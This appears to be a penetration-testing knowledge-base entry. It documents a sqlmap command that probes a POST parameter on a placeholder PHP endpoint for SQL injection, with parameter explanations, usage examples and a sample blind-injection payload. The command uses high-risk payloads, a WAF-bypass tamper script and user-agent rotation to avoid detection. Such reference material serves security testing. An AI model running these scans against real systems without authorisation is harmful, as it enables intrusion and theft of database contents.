---
data: >-
  python3 sqlmap.py -l=5 --risk=3 --tamper=space2comment --random-agent -u
  "https://target.com/olc/xxxcomments/comment_post.php"
  --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments"
  -p staff_student --dbms=mysql
tags:
  - sqli
  - detection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.855Z'
id: bcefd685-16b1-4b38-838b-d729111481f9
verified: false
validated: true
submitted: true
---
# sqlmap-detect-sqli-post

## Command

```bash
python3 sqlmap.py -l=5 --risk=3 --tamper=space2comment --random-agent -u "https://target.com/olc/xxxcomments/comment_post.php" --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments" -p staff_student --dbms=mysql
```

## Description

This command detects SQL injection vulnerabilities in the POST parameter 'staff_student' of a PHP endpoint using sqlmap's automated payloads, evasion techniques, and MySQL-specific testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l=5` or `--level=5` | Sets thoroughness level to 5, testing more injection points | Yes |
| `--risk=3` | Enables high-risk payloads including time-based blinds | Yes |
| `--tamper=space2comment` | Replaces spaces with /**/ to bypass WAF filters | Yes |
| `--random-agent` | Rotates User-Agent headers to evade detection | Yes |
| `-u` | Target URL for the POST request | Yes |
| `--data` | Specifies the POST form data | Yes |
| `-p staff_student` | Focuses testing on the 'staff_student' parameter | Yes |
| `--dbms=mysql` | Assumes MySQL backend for optimized payloads | No |

## Examples

### Basic Usage

```bash
python3 sqlmap.py -l=5 --risk=3 -u "https://target.com/endpoint" --data="param=value" -p param --dbms=mysql
```

### Advanced Usage

```bash
python3 sqlmap.py -l=5 --risk=3 --tamper=space2comment --random-agent -u "https://target.com/endpoint" --data="staff_student=STUDENT&other=fields" -p staff_student --dbms=mysql --verbose=3
```

## Expected Output

Sqlmap will report vulnerable parameters, e.g., 'Parameter: staff_student (POST) is vulnerable. Type: boolean-based blind, Payload: staff_student=STUDENT'||(SELECT 0x...)' , along with injection technique details and total requests (e.g., 103 HTTP requests).

## Related

- [[commands/sqlmap-enumerate-databases]]
- [[procedures/Detect-SQL-Injection-with-sqlmap]]
